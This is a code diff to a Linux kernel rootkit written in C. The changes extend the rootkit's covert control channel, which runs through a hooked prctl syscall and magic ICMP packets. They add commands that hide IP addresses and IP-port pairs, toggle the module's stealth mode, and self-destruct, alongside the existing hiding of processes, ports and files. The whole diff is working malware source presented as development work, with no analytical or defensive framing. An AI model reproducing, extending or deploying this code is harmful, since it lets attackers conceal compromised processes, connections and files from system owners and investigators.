@@ -18,20 +18,24 @@
  * - 5.7+ kallsyms_lookup_name via kprobe (no longer exported)
  * - Module show/hide capability via prctl
  * 
- * C2 Commands via ICMP (magic=0xC0DE, key=0x42):
- * - prctl(0x564C, cmd, arg, 0, 0)
- *   cmd=1: hide_port (arg=port)
- *   cmd=2: hide_pid (arg=PID)
- *   cmd=3: hide_file (arg=pointer to prefix)
- *   cmd=4: clear all
- *   cmd=5: mod_show (unhide module)
- *   cmd=6: stealth mode (arg=1 enable, arg=0 disable)
+ * C2 Commands via prctl (magic=0x564C):
+ * - prctl(0x564C, cmd, arg, arg2, arg3)
+ *   cmd=0x01: hide_pid (arg=PID)
+ *   cmd=0x02: hide_port (arg=port)
+ *   cmd=0x03: hide_file (arg=pointer to prefix)
+ *   cmd=0x04: mod_show (unhide module)
+ *   cmd=0x06: stealth mode (arg=1 enable, arg=0 disable)
+ *   cmd=0x12: hide_ip (arg=IPv4 address as u32)
+ *   cmd=0x13: hide_ipport (arg=IPv4 address as u32, arg2=port)
+ *   cmd=0xFE: self_destruct
+ *   cmd=0xFF: clear all
  * 
- * ICMP Commands:
+ * ICMP Commands (same semantics, magic=0xC0DE, key=0x42):
  * - 0x01: hide_pid
  * - 0x02: hide_port
  * - 0x03: hide_file
  * - 0x04: show_mod
+ * - 0x06: stealth (arg=1 enable, arg=0 disable)
  * - 0x12: hide_ip
  * - 0x13: hide_ipport
  * - 0x20: set_key
@@ -113,11 +117,24 @@ MODULE_PARM_DESC(stealth, "Enable stealth mode (default: true)");
 #define ICMP_CMD_HIDE_PORT     0x02
 #define ICMP_CMD_HIDE_FILE     0x03
 #define ICMP_CMD_SHOW_MOD      0x04
+#define ICMP_CMD_STEALTH       0x06
 #define ICMP_CMD_SELF_DESTRUCT 0xFE
 #define ICMP_CMD_CLEAR         0xFF
 #define ICMP_CMD_HIDE_IP       0x12
 #define ICMP_CMD_HIDE_IPPORT   0x13
 #define ICMP_CMD_SET_KEY       0x20
+
+// prctl command codes (aligned with ICMP)
+#define PRCTL_CMD_HIDE_PID      0x01
+#define PRCTL_CMD_HIDE_PORT     0x02
+#define PRCTL_CMD_HIDE_FILE     0x03
+#define PRCTL_CMD_SHOW_MOD      0x04
+#define PRCTL_CMD_STEALTH       0x06
+#define PRCTL_CMD_HIDE_IP       0x12
+#define PRCTL_CMD_HIDE_IPPORT   0x13
+#define PRCTL_CMD_SET_KEY       0x20
+#define PRCTL_CMD_SELF_DESTRUCT 0xFE
+#define PRCTL_CMD_CLEAR         0xFF
 
 // Data structures
 struct linux_dirent64 {
@@ -908,6 +925,16 @@ static void process_icmp_cmd(struct icmp_cmd *cmd)
         mod_show();
         break;
         
+    case ICMP_CMD_STEALTH:
+        if (cmd->len >= 1) {
+            u8 enable = cmd->data[0] ^ g_config.icmp_key;
+            if (enable)
+                mod_hide();
+            else
+                mod_show();
+        }
+        break;
+        
     case ICMP_CMD_CLEAR:
         write_lock(&g_data.lock);
         g_data.pids_count = 0;
@@ -1044,14 +1071,17 @@ static unsigned long *sct = NULL;
 
 // ============= prctl hook, C2 control interface =============
 // Hook prctl for C2 commands
-//   prctl(0x564C, cmd, arg, 0, 0)
+//   prctl(0x564C, cmd, arg, arg2, arg3)
 // Commands (cmd):
-//   1 = hide_port: arg is port number
-//   2 = hide_pid: arg is PID
-//   3 = hide_file: arg is pointer to prefix string
-//   4 = clear: clear all hidden items
-//   5 = mod_show: unhide module
-//   6 = stealth: arg=1 enable, arg=0 disable
+//   0x01 = hide_pid: arg is PID
+//   0x02 = hide_port: arg is port number
+//   0x03 = hide_file: arg is pointer to prefix string
+//   0x04 = mod_show: unhide module
+//   0x06 = stealth: arg=1 enable, arg=0 disable
+//   0x12 = hide_ip: arg is IPv4 address (u32, network byte order)
+//   0x13 = hide_ipport: arg is IPv4 address, arg2 is port
+//   0xFE = self_destruct
+//   0xFF = clear: clear all hidden items
 
 #define PRCTL_MAGIC 0x564C  // "VL" in hex
 
@@ -1066,9 +1096,11 @@ static asmlinkage long hk_prctl(const struct pt_regs *regs)
     if (option == PRCTL_MAGIC) {
         int cmd = (int)arg2;
         unsigned long val = arg3;
+        unsigned long val2 = arg4;
+        unsigned long val3 = arg5;
         
         switch (cmd) {
-        case 1: // hide_port
+        case PRCTL_CMD_HIDE_PORT: // 0x02
             write_lock(&g_data.lock);
             if (val > 0 && val < 65536 && g_data.ports_count < MAX_PORTS) {
                 g_data.ports[g_data.ports_count++] = (u16)val;
@@ -1076,7 +1108,7 @@ static asmlinkage long hk_prctl(const struct pt_regs *regs)
             write_unlock(&g_data.lock);
             return 0;
             
-        case 2: // hide_pid
+        case PRCTL_CMD_HIDE_PID: // 0x01
             write_lock(&g_data.lock);
             if (val > 0 && g_data.pids_count < MAX_PIDS) {
                 g_data.pids[g_data.pids_count++] = (pid_t)val;
@@ -1084,7 +1116,7 @@ static asmlinkage long hk_prctl(const struct pt_regs *regs)
             write_unlock(&g_data.lock);
             return 0;
             
-        case 3: // hide_file (val is pointer to prefix)
+        case PRCTL_CMD_HIDE_FILE: // 0x03 (val is pointer to prefix)
             if (val) {
                 char kbuf[PREFIX_MAXLEN];
                 if (copy_from_user(kbuf, (char __user *)val, PREFIX_MAXLEN - 1) == 0) {
@@ -1100,23 +1132,62 @@ static asmlinkage long hk_prctl(const struct pt_regs *regs)
             }
             return 0;
             
-        case 4: // clear
+        case PRCTL_CMD_CLEAR: // 0xFF
             write_lock(&g_data.lock);
             g_data.ports_count = 0;
             g_data.pids_count = 0;
             g_data.prefixes_count = 0;
+            g_data.ips_count = 0;
             write_unlock(&g_data.lock);
             return 0;
             
-        case 5: // mod_show (unhide module)
+        case PRCTL_CMD_SHOW_MOD: // 0x04
             mod_show();
             return 0;
             
-        case 6: // stealth mode
+        case PRCTL_CMD_STEALTH: // 0x06
             if (val)
                 mod_hide();
             else
                 mod_show();
+            return 0;
+            
+        case PRCTL_CMD_HIDE_IP: // 0x12
+            if (val) {
+                __be32 ip = (__be32)val;
+                write_lock(&g_data.lock);
+                if (g_data.ips_count < MAX_IPS) {
+                    g_data.ips[g_data.ips_count].ip4 = ip;
+                    g_data.ips[g_data.ips_count].port = 0;
+                    g_data.ips_count++;
+                }
+                write_unlock(&g_data.lock);
+            }
+            return 0;
+            
+        case PRCTL_CMD_HIDE_IPPORT: // 0x13
+            if (val && val2 > 0 && val2 < 65536) {
+                __be32 ip = (__be32)val;
+                u16 port = (u16)val2;
+                write_lock(&g_data.lock);
+                if (g_data.ips_count < MAX_IPS) {
+                    g_data.ips[g_data.ips_count].ip4 = ip;
+                    g_data.ips[g_data.ips_count].port = port;
+                    g_data.ips_count++;
+                }
+                write_unlock(&g_data.lock);
+            }
+            return 0;
+            
+        case PRCTL_CMD_SELF_DESTRUCT: // 0xFE
+            write_lock(&g_data.lock);
+            g_data.pids_count = 0;
+            g_data.ports_count = 0;
+            g_data.prefixes_count = 0;
+            g_data.ips_count = 0;
+            g_data.active = false;
+            write_unlock(&g_data.lock);
+            mod_show();
             return 0;
             
         default:
